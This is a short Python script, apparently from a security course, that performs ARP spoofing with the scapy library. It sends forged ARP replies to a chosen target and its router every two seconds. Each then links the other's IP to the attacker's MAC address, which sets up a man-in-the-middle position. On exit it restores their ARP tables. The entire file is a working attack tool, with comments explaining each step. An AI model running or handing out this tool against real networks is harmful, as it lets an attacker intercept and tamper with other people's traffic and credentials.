import scapy.all as scapy
import time
import sys
import argparse

"""
ARP spoof summary: 

1. create ARP response, not request (op=2)
2. set target IP and MAC address (pdst and hwdst)
3. set spoof IP (psrc). This is to trick the victim and router to associate each other's IP to the hacker's MAC address

"""

def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify the target IP")
    parser.add_argument("-r", "--router", dest="router", help="Specify the router's IP")
    options = parser.parse_args()

    if not options.target: #user did not put a value for target
        parser.error("[-] Please specify the target IP to spoof. use --help for more info.")

    elif not options.router: #user did not put a value for router
        parser.error("[-] Please specify the router's IP. use --help for more info.")

    else:
        return options #arguments is not used, so return only options

def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request #encapsulation

    # get answered list, first packet (no other packets since only 1 IP), received packet, mac address.
    # this will throw an list index error if the IP is wrong.
    try:
        mac_address = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0][0][1].hwsrc

    except IndexError: # invalid IP.
        print("[-] Invalid IP specified. Please try again")
        sys.exit(0)

    return mac_address


def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)

    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # scapy automatically sets source MAC as the hacker's MAC address, since packet is coming from there.

    scapy.send(arp_packet, verbose=False)


# restore ARP tables by giving correct source IP and MAC
def restore_ARP(dest_ip, source_ip):

    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)

    # hwsrc --> need to specify that the source IP (router) comes from the correct source MAC (router).

    scapy.send(arp_packet, count=4, verbose=False) #send this packet 4 times to make sure target receives it

options = get_argument()
target_ip = options.target
router_ip = options.router

sent_packet_count = 0


try:

    while(True): # keep attack going for as long as needed

        spoof(target_ip, router_ip) # tell target that hacker is router
        spoof(router_ip, target_ip) # tell router that hacker is target

        sent_packet_count += 2

        print("\r[+] Packets sent: " + str(sent_packet_count)),
        sys.stdout.flush()

        time.sleep(2) # send spoof packet every 2 seconds

except KeyboardInterrupt: # exit program and restore ARP tables

    print("\n[-] Detected CTRL + C ....... Resetting ARP tables.... Please wait...")

    restore_ARP(target_ip, router_ip) # restore target's ARP tables
    restore_ARP(router_ip, target_ip) # restore router's ARP tables

    print("[-] ARP tables restored. Exiting program.")